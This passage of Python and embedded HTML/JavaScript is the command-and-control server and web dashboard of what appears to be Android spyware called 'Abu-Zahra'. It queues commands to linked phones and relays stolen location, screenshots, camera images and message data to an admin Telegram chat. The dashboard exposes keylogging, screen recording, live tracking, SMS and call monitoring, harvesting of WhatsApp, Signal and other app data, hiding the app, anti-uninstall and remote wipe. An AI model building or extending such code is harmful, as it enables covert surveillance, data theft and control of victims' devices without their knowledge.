            c["status"] = "sent"
            c["sent_at"] = ts()
    save_json(COMMANDS_FILE, commands)
    
    # Update last seen
    update_device(device_id, {"active": True})
    
    return web.json_response({
        "ok": True,
        "commands": pending,
        "count": len(pending),
        "server_time": ts(),
    })


async def api_command_result(request):
    """POST /api/command_result/{command_id} - Submit command result."""
    global api_hits
    api_hits += 1
    cmd_id = request.match_info.get("command_id", "")
    try:
        body = await request.json()
        status = body.get("status", "completed")
        result = body.get("result")
        
        updated = update_command_status(cmd_id, status, result)
        if not updated:
            return web.json_response({"ok": False, "error": "Command not found"}, status=404)
        
        # Forward result to admin
        cmd_name = updated.get("command", "")
        device_id = updated.get("device_id", "")
        d = find_device(device_id)
        dev_name = d.get("name", device_id) if d else device_id
        
        result_text = str(result)[:3000] if result else "No data"
        await send_admin(
            f"✅ <b>Command Result</b>\n\n"
            f"📱 Device: <code>{dev_name}</code>\n"
            f"📋 Command: <code>{cmd_name}</code>\n"
            f"🆔 ID: <code>{cmd_id}</code>\n"
            f"📊 Status: <code>{status}</code>\n\n"
            f"📦 Result:\n<code>{result_text}</code>",
            disable_notification=True
        )
        
        return web.json_response({"ok": True, "message": "Result received"})
    except Exception as exc:
        log.error("command_result error: %s", exc)
        return web.json_response({"ok": False, "error": str(exc)}, status=500)


async def api_device_data(request):
    """POST /api/data/{device_id} - Receive data from device."""
    global api_hits
    api_hits += 1
    device_id = request.match_info.get("device_id", "")
    try:
        body = await request.json()
        data_type = body.get("type", "")
        data = body.get("data", {})
        
        d = find_device(device_id)
        if not d:
            return web.json_response({"ok": False, "error": "Device not found"}, status=404)
        
        dev_name = d.get("name", device_id)
        update_device(device_id, {"active": True})
        
        # Handle different data types
        if data_type == "location":
            lat = data.get("lat", "")
            lon = data.get("lon", "")
            update_device(device_id, {"location": f"{lat},{lon}"})
            await send_admin(
                f"📍 <b>Location Update</b>\n"
                f"📱 {dev_name}\n"
                f"🗺️ <a href='https://maps.google.com/?q={lat},{lon}'>View Map</a>",
                disable_notification=True
            )
        elif data_type == "battery":
            level = data.get("level", "?")
            update_device(device_id, {"battery": level})
        elif data_type == "screenshot" or data_type == "camera":
            img_data = data.get("image", "")
            if img_data and len(img_data) > 100:
                import base64
                try:
                    await send_photo(ADMIN_CHAT_ID, base64.b64decode(img_data),
                                     caption=f"📷 {data_type} from {dev_name}")
                except:
                    await send_admin(f"📷 {data_type} from {dev_name}\n(Image data received)", disable_notification=True)
        else:
            # Generic data forward
            data_str = json.dumps(data, ensure_ascii=False)[:3000] if data else "Empty"
            await send_admin(
                f"📦 <b>Data Received</b>\n"
                f"📱 {dev_name}\n"
                f"📋 Type: <code>{data_type}</code>\n\n"
                f"<code>{data_str}</code>",
                disable_notification=True
            )
        
        append_event(f"Data received: {data_type}", {"device_id": device_id})
        
        return web.json_response({"ok": True, "message": "Data received"})
    except Exception as exc:
        log.error("device_data error: %s", exc)
        return web.json_response({"ok": False, "error": str(exc)}, status=500)


async def api_device_settings(request):
    """GET /api/settings/{device_id} - Get device settings."""
    global api_hits
    api_hits += 1
    device_id = request.match_info.get("device_id", "")
    d = find_device(device_id)
    if not d:
        return web.json_response({"ok": False, "error": "Device not found"}, status=404)
    
    settings = load_settings()
    return web.json_response({
        "ok": True,
        "settings": {
            "sync_interval": settings.get("sync_interval", 300),
            "location_interval": settings.get("location_interval", 60),
            "auto_location": settings.get("auto_location", True),
            "auto_sync": settings.get("auto_sync", True),
            "keylogger": settings.get("keylogger", False),
            "notifications": settings.get("notifications", True),
        }
    })


async def api_web_login(request):
    """POST /api/login - Web dashboard login."""
    global api_hits
    api_hits += 1
    try:
        body = await request.json()
        username = body.get("username", "admin")
        password = body.get("password", "")
        ip = request.remote or ""
        ua = request.headers.get("User-Agent", "")
        
        session = create_session(username, password, ip, ua)
        if not session:
            return web.json_response({"ok": False, "error": "Invalid credentials"}, status=401)
        
        return web.json_response({
            "ok": True,
            "token": session["token"],
            "expires_at": session["expires_at"],
        })
    except Exception as exc:
        return web.json_response({"ok": False, "error": str(exc)}, status=500)


def require_auth(func):
    """Decorator to require valid session token."""
    async def wrapper(request, *args, **kwargs):
        global api_hits
        api_hits += 1
        auth = request.headers.get("Authorization", "")
        token = auth.replace("Bearer ", "") if auth.startswith("Bearer ") else ""
        if not token:
            return web.json_response({"ok": False, "error": "Unauthorized"}, status=401)
        session = validate_session(token)
        if not session:
            return web.json_response({"ok": False, "error": "Session expired"}, status=401)
        request["session"] = session
        return await func(request, *args, **kwargs)
    return wrapper


@require_auth
async def api_web_devices(request):
    devices = get_devices()
    return web.json_response({"ok": True, "devices": devices})


@require_auth
async def api_web_device_detail(request):
    device_id = request.match_info.get("device_id", "")
    d = find_device(device_id)
    if not d:
        return web.json_response({"ok": False, "error": "Not found"}, status=404)
    cmds = load_json(COMMANDS_FILE, [])
    device_cmds = [c for c in cmds if c.get("device_id") == device_id][-50:]
    return web.json_response({"ok": True, "device": d, "commands": device_cmds})


@require_auth
async def api_web_commands(request):
    commands = load_json(COMMANDS_FILE, [])
    return web.json_response({"ok": True, "commands": commands[-100:]})


@require_auth
async def api_web_events(request):
    events = load_json(EVENTS_FILE, [])
    return web.json_response({"ok": True, "events": events[-100:]})


@require_auth
async def api_web_stats(request):
    devices = get_devices()
    online = sum(1 for d in devices if d.get("active"))
    cmds = load_json(COMMANDS_FILE, [])
    pending = sum(1 for c in cmds if c.get("status") == "pending")
    completed = sum(1 for c in cmds if c.get("status") == "completed")
    events = load_json(EVENTS_FILE, [])
    return web.json_response({
        "ok": True,
        "stats": {
            "uptime": get_uptime(),
            "uptime_formatted": format_uptime(get_uptime()),
            "devices_total": len(devices),
            "devices_online": online,
            "commands_total": len(cmds),
            "commands_pending": pending,
            "commands_completed": completed,
            "messages_sent": messages_sent,
            "api_hits": api_hits,
            "events_total": len(events),
            "total_registered_commands": len(COMMAND_REGISTRY),
            "server_time": ts(),
            "port": SERVER_PORT,
            "domain": SERVER_DOMAIN,
        }
    })


@require_auth
async def api_web_send_command(request):
    try:
        body = await request.json()
        device_id = body.get("device_id", "")
        command = body.get("command", "")
        params = body.get("params", {})
        
        if not device_id or not command:
            return web.json_response({"ok": False, "error": "device_id and command required"}, status=400)
        
        d = find_device(device_id)
        if not d:
            return web.json_response({"ok": False, "error": "Device not found"}, status=404)
        
        cmd = queue_command(device_id, command, params)
        return web.json_response({"ok": True, "command": cmd})
    except Exception as exc:
        return web.json_response({"ok": False, "error": str(exc)}, status=500)


@require_auth
async def api_web_link_code(request):
    entry = generate_link_code()
    return web.json_response({"ok": True, "code": entry["code"], "expires_at": entry["expires_at"]})


@require_auth
async def api_web_settings_get(request):
    settings = load_settings()
    return web.json_response({"ok": True, "settings": settings})


@require_auth
async def api_web_settings_set(request):
    try:
        body = await request.json()
        settings = load_settings()
        for key, value in body.items():
            if key in settings:
                settings[key] = value
        save_settings_data(settings)
        return web.json_response({"ok": True})
    except Exception as exc:
        return web.json_response({"ok": False, "error": str(exc)}, status=500)


@require_auth
async def api_web_unlink(request):
    device_id = request.match_info.get("device_id", "")
    if remove_device(device_id):
        return web.json_response({"ok": True})
    return web.json_response({"ok": False, "error": "Not found"}, status=404)

# ============================================================================
# WEB DASHBOARD HTML
# ============================================================================

DASHBOARD_HTML = r"""<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Abu-Zahra Dashboard</title>
<style>
:root{--bg:#0a0a0f;--surface:#12121a;--surface2:#1a1a2e;--border:#2a2a3e;--text:#e0e0e0;--text2:#888;--accent:#e63946;--accent2:#ff6b6b;--green:#4ade80;--blue:#60a5fa;--yellow:#fbbf24;--purple:#a78bfa;--radius:12px}
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Segoe UI',Tahoma,sans-serif;background:var(--bg);color:var(--text);min-height:100vh}
.login-page{display:flex;align-items:center;justify-content:center;min-height:100vh;background:linear-gradient(135deg,#0a0a0f,#1a1a2e)}
.login-box{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);padding:40px;width:360px;max-width:90vw;text-align:center}
.login-box h1{color:var(--accent);margin-bottom:8px;font-size:24px}
.login-box p{color:var(--text2);margin-bottom:24px;font-size:14px}
.login-box input{width:100%;padding:12px 16px;border-radius:8px;border:1px solid var(--border);background:var(--bg);color:var(--text);font-size:15px;margin-bottom:12px;outline:none;transition:border .2s}
.login-box input:focus{border-color:var(--accent)}
.login-box button{width:100%;padding:12px;border:none;border-radius:8px;background:var(--accent);color:#fff;font-size:16px;cursor:pointer;transition:background .2s;font-weight:bold}
.login-box button:hover{background:var(--accent2)}
.login-error{color:var(--accent);font-size:13px;margin-top:8px;display:none}
.app{display:none;min-height:100vh}
.sidebar{position:fixed;top:0;right:0;width:240px;height:100vh;background:var(--surface);border-left:1px solid var(--border);padding:20px 0;z-index:100;transition:transform .3s}
.sidebar .logo{padding:0 20px 20px;border-bottom:1px solid var(--border);margin-bottom:16px}
.sidebar .logo h2{color:var(--accent);font-size:18px}
.sidebar .logo span{color:var(--text2);font-size:11px}
.sidebar a{display:flex;align-items:center;padding:12px 20px;color:var(--text2);text-decoration:none;transition:all .2s;cursor:pointer;font-size:14px;gap:10px}
.sidebar a:hover,.sidebar a.active{background:var(--surface2);color:var(--text)}
.sidebar a.active{border-right:3px solid var(--accent);color:var(--accent)}
.main{margin-right:240px;padding:24px;min-height:100vh}
.page{display:none}
.page.active{display:block}
.topbar{display:flex;align-items:center;justify-content:space-between;margin-bottom:24px;flex-wrap:wrap;gap:12px}
.topbar h1{font-size:22px;font-weight:600}
.topbar .time{color:var(--text2);font-size:13px}
.stats-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:16px;margin-bottom:24px}
.stat-card{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);padding:20px}
.stat-card .label{color:var(--text2);font-size:13px;margin-bottom:8px}
.stat-card .value{font-size:28px;font-weight:700}
.stat-card .sub{color:var(--text2);font-size:12px;margin-top:4px}
.card{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);padding:20px;margin-bottom:16px}
.card h3{margin-bottom:16px;font-size:16px;display:flex;align-items:center;gap:8px}
table{width:100%;border-collapse:collapse}
th,td{padding:10px 12px;text-align:right;border-bottom:1px solid var(--border);font-size:13px}
th{color:var(--text2);font-weight:500}
.badge{display:inline-block;padding:2px 8px;border-radius:12px;font-size:11px;font-weight:600}
.badge-green{background:#166534;color:var(--green)}
.badge-red{background:#7f1d1d;color:#fca5a5}
.badge-yellow{background:#713f12;color:var(--yellow)}
.badge-blue{background:#1e3a5f;color:var(--blue)}
.btn{padding:8px 16px;border:none;border-radius:8px;cursor:pointer;font-size:13px;transition:all .2s;display:inline-flex;align-items:center;gap:6px}
.btn-primary{background:var(--accent);color:#fff}
.btn-primary:hover{background:var(--accent2)}
.btn-secondary{background:var(--surface2);color:var(--text);border:1px solid var(--border)}
.btn-sm{padding:6px 12px;font-size:12px}
.btn-danger{background:#7f1d1d;color:#fca5a5}
.cmd-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:8px}
.cmd-btn{padding:10px 14px;border-radius:8px;border:1px solid var(--border);background:var(--surface2);color:var(--text);cursor:pointer;font-size:13px;transition:all .2s;text-align:right}
.cmd-btn:hover{border-color:var(--accent);background:rgba(230,57,70,.1)}
.device-card{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);padding:20px;cursor:pointer;transition:all .2s}
.device-card:hover{border-color:var(--accent);transform:translateY(-2px)}
.device-card .name{font-size:16px;font-weight:600;margin-bottom:4px}
.device-card .meta{color:var(--text2);font-size:12px}
.device-cards{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:16px}
.log-item{padding:8px 0;border-bottom:1px solid var(--border);font-size:12px;display:flex;gap:12px}
.log-item .time{color:var(--text2);white-space:nowrap;font-family:monospace}
.log-item .event{flex:1}
.modal-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.7);z-index:200;align-items:center;justify-content:center}
.modal-overlay.show{display:flex}
.modal{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);padding:24px;width:500px;max-width:90vw;max-height:80vh;overflow-y:auto}
.modal h2{margin-bottom:16px;font-size:18px}
.search-box{display:flex;gap:8px;margin-bottom:16px}
.search-box input{flex:1;padding:10px 14px;border-radius:8px;border:1px solid var(--border);background:var(--bg);color:var(--text);font-size:14px;outline:none}
.hamburger{display:none;position:fixed;top:16px;right:16px;z-index:150;background:var(--accent);color:#fff;border:none;width:40px;height:40px;border-radius:8px;font-size:20px;cursor:pointer}
@media(max-width:768px){
.sidebar{transform:translateX(100%)}
.sidebar.open{transform:translateX(0)}
.main{margin-right:0;padding:16px;padding-top:60px}
.hamburger{display:block}
.stats-grid{grid-template-columns:repeat(2,1fr)}
.device-cards{grid-template-columns:1fr}
.cmd-grid{grid-template-columns:repeat(auto-fill,minmax(160px,1fr))}
}
.pulse{animation:pulse 2s infinite}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.5}}
.empty{text-align:center;color:var(--text2);padding:40px;font-size:14px}
.tabs{display:flex;gap:4px;margin-bottom:16px;flex-wrap:wrap}
.tab{padding:8px 16px;border-radius:8px;border:1px solid var(--border);background:transparent;color:var(--text2);cursor:pointer;font-size:13px;transition:all .2s}
.tab.active{background:var(--accent);color:#fff;border-color:var(--accent)}
.notification{position:fixed;top:20px;left:20px;background:var(--surface);border:1px solid var(--border);border-radius:8px;padding:12px 20px;z-index:300;transform:translateX(-400px);transition:transform .3s;font-size:14px}
.notification.show{transform:translateX(0)}
.command-log .cmd-item{padding:10px;border:1px solid var(--border);border-radius:8px;margin-bottom:8px;background:var(--surface2)}
.command-log .cmd-item .cmd-header{display:flex;justify-content:space-between;margin-bottom:6px}
</style>
</head>
<body>
<div class="login-page" id="loginPage">
<div class="login-box">
<h1>🟥 Abu-Zahra</h1>
<p>Control Dashboard</p>
<input type="text" id="loginUser" placeholder="Username" value="admin">
<input type="password" id="loginPass" placeholder="Password">
<button onclick="doLogin()">Login</button>
<div class="login-error" id="loginError">Invalid credentials</div>
</div>
</div>

<button class="hamburger" id="hamburger" onclick="toggleSidebar()">☰</button>

<div class="app" id="app">
<nav class="sidebar" id="sidebar">
<div class="logo"><h2>🟥 Abu-Zahra</h2><span>Control Panel v3.0</span></div>
<a class="active" onclick="showPage('dashboard')">📊 Dashboard</a>
<a onclick="showPage('devices')">📱 Devices</a>
<a onclick="showPage('commands')">🎮 Commands</a>
<a onclick="showPage('files')">📂 Files</a>
<a onclick="showPage('data')">📦 Data</a>
<a onclick="showPage('monitor')">🔍 Monitor</a>
<a onclick="showPage('settings')">⚙️ Settings</a>
<a onclick="showPage('logs')">📝 Logs</a>
<a onclick="doLogout()">🚪 Logout</a>
</nav>
<div class="main">

<div class="page active" id="page-dashboard">
<div class="topbar"><h1>📊 Dashboard</h1><span class="time" id="clock"></span></div>
<div class="stats-grid" id="statsGrid"></div>
<div class="card"><h3>📱 Active Devices</h3><div id="dashDevices" class="device-cards"></div></div>
<div class="card"><h3>📋 Recent Commands</h3><div id="dashCommands"></div></div>
</div>

<div class="page" id="page-devices">
<div class="topbar"><h1>📱 Devices</h1><button class="btn btn-primary" onclick="generateLink()">🔗 Link Device</button></div>
<div id="linkCodeBox" style="display:none" class="card"><h3>🔗 Link Code</h3><p id="linkCodeText" style="font-size:24px;font-weight:bold;text-align:center;color:var(--accent)"></p></div>
<div class="device-cards" id="deviceList"></div>
<div class="card" id="deviceDetail" style="display:none"></div>
</div>

<div class="page" id="page-commands">
<div class="topbar"><h1>🎮 Command Center</h1></div>
<div class="card"><h3>Send Command</h3>
<div class="search-box"><select id="cmdDevice" style="flex:1;padding:10px;border-radius:8px;border:1px solid var(--border);background:var(--bg);color:var(--text)"></select></div>
<div class="tabs" id="cmdTabs"></div>
<div class="cmd-grid" id="cmdGrid"></div>
</div>
<div class="card"><h3>Command Log</h3><div id="cmdLog" class="command-log"></div></div>
</div>

<div class="page" id="page-files">
<div class="topbar"><h1>📂 File Browser</h1></div>
<div class="card"><h3>Select device to browse files</h3>
<select id="fileDevice" style="width:100%;padding:10px;border-radius:8px;border:1px solid var(--border);background:var(--bg);color:var(--text)"></select>
<div class="cmd-grid" style="margin-top:12px">
<button class="cmd-btn" onclick="sendCmd('list_downloads')">📥 Downloads</button>
<button class="cmd-btn" onclick="sendCmd('list_dcim')">📸 DCIM</button>
<button class="cmd-btn" onclick="sendCmd('list_music')">🎵 Music</button>
<button class="cmd-btn" onclick="sendCmd('list_videos')">🎬 Videos</button>
<button class="cmd-btn" onclick="sendCmd('list_documents')">📁 Documents</button>
<button class="cmd-btn" onclick="sendCmd('list_whatsapp')">💬 WhatsApp</button>
<button class="cmd-btn" onclick="sendCmd('list_telegram_files')">✈️ Telegram</button>
<button class="cmd-btn" onclick="sendCmd('recent_files')">🕐 Recent</button>
</div></div>
</div>

<div class="page" id="page-data">
<div class="topbar"><h1>📦 Data Viewer</h1></div>
<div class="card"><h3>Quick Data</h3>
<select id="dataDevice" style="width:100%;padding:10px;border-radius:8px;border:1px solid var(--border);background:var(--bg);color:var(--text);margin-bottom:12px"></select>
<div class="cmd-grid">
<button class="cmd-btn" onclick="sendDataCmd('sms')">📲 SMS</button>
<button class="cmd-btn" onclick="sendDataCmd('calls')">📞 Calls</button>
<button class="cmd-btn" onclick="sendDataCmd('contacts')">📇 Contacts</button>
<button class="cmd-btn" onclick="sendDataCmd('location')">📍 Location</button>
<button class="cmd-btn" onclick="sendDataCmd('notifications')">🔔 Notifications</button>
<button class="cmd-btn" onclick="sendDataCmd('clipboard')">📋 Clipboard</button>
<button class="cmd-btn" onclick="sendDataCmd('battery')">🔋 Battery</button>
<button class="cmd-btn" onclick="sendDataCmd('info')">ℹ️ Device Info</button>
</div></div>
</div>

<div class="page" id="page-monitor">
<div class="topbar"><h1>🔍 Monitoring</h1></div>
<div class="card"><h3>Monitor Controls</h3>
<select id="monDevice" style="width:100%;padding:10px;border-radius:8px;border:1px solid var(--border);background:var(--bg);color:var(--text);margin-bottom:12px"></select>
<div class="cmd-grid">
<button class="cmd-btn" onclick="sendMonCmd('keylogger_start')">⌨️ Start Keylogger</button>
<button class="cmd-btn" onclick="sendMonCmd('keylogger_stop')">⏹ Stop Keylogger</button>
<button class="cmd-btn" onclick="sendMonCmd('get_keylogger')">📥 Get Keys</button>
<button class="cmd-btn" onclick="sendMonCmd('screen_record_start')">🔴 Start Screen Record</button>
<button class="cmd-btn" onclick="sendMonCmd('screen_record_stop')">⏹ Stop Screen Record</button>
<button class="cmd-btn" onclick="sendMonCmd('location_live')">🗺️ Live Location</button>
<button class="cmd-btn" onclick="sendMonCmd('location_stop')">⏹ Stop Tracking</button>
<button class="cmd-btn" onclick="sendMonCmd('location_history')">📜 Location History</button>
<button class="cmd-btn" onclick="sendMonCmd('sms_monitor')">📲 SMS Monitor</button>
<button class="cmd-btn" onclick="sendMonCmd('call_monitor')">📞 Call Monitor</button>
</div></div>
</div>

<div class="page" id="page-settings">
<div class="topbar"><h1>⚙️ Settings</h1></div>
<div class="card"><h3>Server Settings</h3>
<div id="settingsForm"></div>
<button class="btn btn-primary" onclick="saveSettings()" style="margin-top:12px">💾 Save</button></div>
</div>

<div class="page" id="page-logs">
<div class="topbar"><h1>📝 Event Logs</h1><button class="btn btn-secondary btn-sm" onclick="loadEvents()">🔄 Refresh</button></div>
<div class="card"><div id="eventLog"></div></div>
</div>

</div></div>

<div class="notification" id="notif"></div>

<script>
let TOKEN=localStorage.getItem('az_token')||'';
let POLL_INTERVAL=null;
let DEVICES=[];

function notify(msg,color='var(--green)'){
const n=document.getElementById('notif');
n.textContent=msg;n.style.borderColor=color;n.classList.add('show');
setTimeout(()=>n.classList.remove('show'),3000);
}

function api(path,opts={}){
return fetch('/api/'+path,{
headers:{'Content-Type':'application/json',...(TOKEN?{'Authorization':'Bearer '+TOKEN}:{})},
...opts
}).then(r=>r.json());
}

async function doLogin(){
const u=document.getElementById('loginUser').value;
const p=document.getElementById('loginPass').value;
const r=await api('login',{method:'POST',body:JSON.stringify({username:u,password:p})});
if(r.ok){TOKEN=r.token;localStorage.setItem('az_token',TOKEN);showApp();}
else{document.getElementById('loginError').style.display='block';}
}

function doLogout(){
TOKEN='';localStorage.removeItem('az_token');
document.getElementById('app').style.display='none';
document.getElementById('loginPage').style.display='flex';
if(POLL_INTERVAL)clearInterval(POLL_INTERVAL);
}

function showApp(){
document.getElementById('loginPage').style.display='none';
document.getElementById('app').style.display='block';
loadAll();
POLL_INTERVAL=setInterval(loadAll,5000);
}

function toggleSidebar(){document.getElementById('sidebar').classList.toggle('open');}

function showPage(name){
document.querySelectorAll('.page').forEach(p=>p.classList.remove('active'));
document.getElementById('page-'+name).classList.add('active');
document.querySelectorAll('.sidebar a').forEach(a=>a.classList.remove('active'));
event.target.classList.add('active');
document.getElementById('sidebar').classList.remove('open');
}

function updateClock(){
const now=new Date();
document.getElementById('clock').textContent=now.toLocaleString('en-US');
}
setInterval(updateClock,1000);updateClock();

function populateDeviceSelects(){
const html=DEVICES.map(d=>`<option value="${d.id}">${d.name||d.id} (${d.active?'🟢':'🔴'})</option>`).join('');
['cmdDevice','fileDevice','dataDevice','monDevice'].forEach(id=>{
const el=document.getElementById(id);if(el)el.innerHTML=html;
});
}

async function loadAll(){
try{const r=await api('web/stats');if(r.ok)renderStats(r.stats);}catch(e){}
try{const r=await api('web/devices');if(r.ok){DEVICES=r.devices||[];populateDeviceSelects();renderDevices();}}catch(e){}
try{const r=await api('web/commands');if(r.ok)renderCommandLog(r.commands);}catch(e){}
}

function renderStats(s){
const grid=document.getElementById('statsGrid');
grid.innerHTML=`
<div class="stat-card"><div class="label">⏱ Uptime</div><div class="value">${s.uptime_formatted||'-'}</div></div>
<div class="stat-card"><div class="label">📱 Devices</div><div class="value" style="color:var(--blue)">${s.devices_total}</div><div class="sub">🟢 ${s.devices_online} online</div></div>
<div class="stat-card"><div class="label">📋 Commands</div><div class="value" style="color:var(--yellow)">${s.total_registered_commands}</div><div class="sub">⏳ ${s.commands_pending} pending</div></div>
<div class="stat-card"><div class="label">📨 Messages</div><div class="value" style="color:var(--purple)">${s.messages_sent}</div></div>
<div class="stat-card"><div class="label">📡 API</div><div class="value">${s.api_hits}</div><div class="sub">hits</div></div>
<div class="stat-card"><div class="label">✅ Completed</div><div class="value" style="color:var(--green)">${s.commands_completed}</div></div>`;
}

function renderDevices(){
const el=document.getElementById('deviceList');
const dash=document.getElementById('dashDevices');
if(!DEVICES.length){
el.innerHTML='<div class="empty">No devices linked</div>';
dash.innerHTML='<div class="empty">No devices</div>';
return;
}
const card=d=>`
<div class="device-card" onclick="showDeviceDetail('${d.id}')">
<div class="name">${d.active?'🟢':'🔴'} ${d.name||d.id}</div>
<div class="meta">Model: ${d.model||'-'} | OS: ${d.os||'-'}</div>
<div class="meta">Battery: ${d.battery||'-'}% | Last: ${d.last_seen||'-'}</div>
</div>`;
el.innerHTML=DEVICES.map(card).join('');
dash.innerHTML=DEVICES.slice(0,4).map(card).join('');
}

async function showDeviceDetail(id){
try{
const r=await api('web/device/'+id);
if(!r.ok)return;
const d=r.device;const cmds=r.commands||[];
const detail=document.getElementById('deviceDetail');
detail.style.display='block';
detail.innerHTML=`
<h2>📱 ${d.name||d.id}</h2>
<div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;margin:16px 0">
<div><span style="color:var(--text2)">ID:</span> <code>${d.id}</code></div>
<div><span style="color:var(--text2)">Status:</span> ${d.active?'<span class="badge badge-green">Online</span>':'<span class="badge badge-red">Offline</span>'}</div>
<div><span style="color:var(--text2)">Model:</span> ${d.model||'-'}</div>
<div><span style="color:var(--text2)">OS:</span> ${d.os||'-'}</div>
<div><span style="color:var(--text2)">Battery:</span> ${d.battery||'-'}%</div>
<div><span style="color:var(--text2)">Network:</span> ${d.network||'-'}</div>
<div><span style="color:var(--text2)">Location:</span> ${d.location||'-'}</div>
<div><span style="color:var(--text2)">Last Seen:</span> ${d.last_seen||'-'}</div>
</div>
<h3>📋 Recent Commands</h3>
${cmds.length?cmds.map(c=>`<div class="cmd-item"><div class="cmd-header"><span>${c.command}</span><span class="badge badge-${c.status==='completed'?'green':c.status==='pending'?'yellow':'blue'}">${c.status}</span></div><div style="color:var(--text2);font-size:12px">${c.created_at} | ID: ${c.id}</div></div>`).join(''):'<div class="empty">No commands</div>'}
<button class="btn btn-danger btn-sm" onclick="unlinkDevice('${d.id}')" style="margin-top:16px">🗑️ Unlink Device</button>`;
detail.scrollIntoView({behavior:'smooth'});
}catch(e){}
}

async function unlinkDevice(id){
if(!confirm('Unlink this device?'))return;
const r=await api('web/unlink/'+id,{method:'DELETE'});
if(r.ok){notify('Device unlinked');loadAll();}
else notify('Failed','var(--accent)');
}

async function generateLink(){
const r=await api('web/link_code');
if(r.ok){
const box=document.getElementById('linkCodeBox');
document.getElementById('linkCodeText').textContent=r.code;
box.style.display='block';
notify('Link code generated!');
}
}

const CMD_CATEGORIES={
data:{label:'📊 Data',cmds:['sms','calls','contacts','location','notifications','apps','info','battery','gallery','clipboard','all_data','wifi_info','bluetooth_devices','network_info','sim_info','storage_info','installed_apps','running_apps','calendar','browser_history']},
social:{label:'🌐 Social',cmds:['whatsapp','telegram_app','instagram','messenger','snapchat','tiktok','twitter','viber','signal','facebook','whatsapp_status','whatsapp_stories','telegram_channels','instagram_stories','youtube']},
control:{label:'🎮 Control',cmds:['ping','vibrate','ring','screenshot','front_camera','back_camera','record_audio','record_video','lock_phone','unlock_phone','reboot','shutdown','set_volume','set_brightness','enable_wifi','disable_wifi','enable_bluetooth','disable_bluetooth','enable_mobile_data','disable_mobile_data','enable_hotspot','disable_hotspot','airplane_on','airplane_off','torch_on','torch_off','play_sound','speak_text','open_url','send_sms','make_call','block_number','unblock_number']},
apps:{label:'📦 Apps',cmds:['open_app','close_app','install_app','uninstall_app','block_app','unblock_app','clear_app_data','force_stop_app','app_info','app_usage','screen_time','app_permissions','enable_app','disable_app','list_blocked','clear_cache','update_app','launch_app','kill_app','app_cache']},
files:{label:'📂 Files',cmds:['list_files','get_file','download_file','list_downloads','list_dcim','list_music','list_videos','list_documents','list_whatsapp','list_telegram_files','send_contacts_backup','send_sms_backup','send_calls_backup','send_full_backup','delete_file','rename_file','copy_file','move_file','create_folder','search_files','recent_files','file_info','zip_files']},
security:{label:'🔒 Security',cmds:['wipe_data','factory_reset','show_app','hide_app','change_passcode','set_pin','remove_pin','enable_biometric','disable_biometric','anti_uninstall_on','anti_uninstall_off','device_admin_status','check_root','set_screen_lock','remove_screen_lock']},
monitor:{label:'🔍 Monitor',cmds:['keylogger_start','keylogger_stop','get_keylogger','screen_record_start','screen_record_stop','clipboard_monitor_start','clipboard_monitor_stop','get_clipboard_log','wifi_monitor_start','wifi_monitor_stop','app_monitor_start','app_monitor_stop','get_app_log','location_live','location_stop','location_history','geo_add','geo_remove','geo_list','sms_monitor','call_monitor']},
syssettings:{label:'⚙️ System',cmds:['set_language','set_timezone','set_alarm','set_timer','set_reminder','enable_dev_mode','disable_dev_mode','enable_usb_debug','disable_usb_debug','dns_change','proxy_set','apn_settings','nfc_on','nfc_off','auto_update_on','auto_update_off']}
};

function initCmdTabs(){
const tabs=document.getElementById('cmdTabs');
tabs.innerHTML=Object.keys(CMD_CATEGORIES).map(k=>`<button class="tab${k==='data'?' active':''}" onclick="showCmdCat('${k}',this)">${CMD_CATEGORIES[k].label}</button>`).join('');
showCmdCat('data');
}

function showCmdCat(cat,btn){
if(btn){document.querySelectorAll('#cmdTabs .tab').forEach(t=>t.classList.remove('active'));btn.classList.add('active');}
const grid=document.getElementById('cmdGrid');
grid.innerHTML=CMD_CATEGORIES[cat].cmds.map(c=>`<button class="cmd-btn" onclick="sendDeviceCmd('${c}')">${c.replace(/_/g,' ')}</button>`).join('');
}

async function sendDeviceCmd(cmd){
const devId=document.getElementById('cmdDevice').value;
if(!devId){notify('Select a device','var(--accent)');return;}
const r=await api('web/send_command',{method:'POST',body:JSON.stringify({device_id:devId,command:cmd})});
if(r.ok)notify('Command sent!');else notify('Failed','var(--accent)');
loadAll();
}

function sendCmd(cmd){
const devId=document.getElementById('fileDevice').value;
if(!devId){notify('Select a device','var(--accent)');return;}
api('web/send_command',{method:'POST',body:JSON.stringify({device_id:devId,command:cmd})}).then(r=>{
if(r.ok)notify('Command sent!');else notify('Failed','var(--accent)');
});
}
function sendDataCmd(cmd){
const devId=document.getElementById('dataDevice').value;
if(!devId){notify('Select a device','var(--accent)');return;}
api('web/send_command',{method:'POST',body:JSON.stringify({device_id:devId,command:'get_'+cmd})}).then(r=>{
if(r.ok)notify('Command sent!');else notify('Failed','var(--accent)');
});
}
function sendMonCmd(cmd){
const devId=document.getElementById('monDevice').value;
if(!devId){notify('Select a device','var(--accent)');return;}
api('web/send_command',{method:'POST',body:JSON.stringify({device_id:devId,command:cmd})}).then(r=>{
if(r.ok)notify('Command sent!');else notify('Failed','var(--accent)');
});
}

function renderCommandLog(cmds){
const el=document.getElementById('cmdLog');
const dash=document.getElementById('dashCommands');
const items=(cmds||[]).slice(-20).reverse();
if(!items.length){el.innerHTML='<div class="empty">No commands</div>';dash.innerHTML='';return;}
const html=items.map(c=>`<div class="cmd-item"><div class="cmd-header"><span>${c.command}</span><span class="badge badge-${c.status==='completed'?'green':c.status==='pending'?'yellow':'blue'}">${c.status}</span></div><div style="color:var(--text2);font-size:12px">Device: ${c.device_id} | ${c.created_at}</div></div>`).join('');
el.innerHTML=html;
dash.innerHTML=html;
}

async function loadEvents(){
const r=await api('web/events');
if(r.ok){
const el=document.getElementById('eventLog');
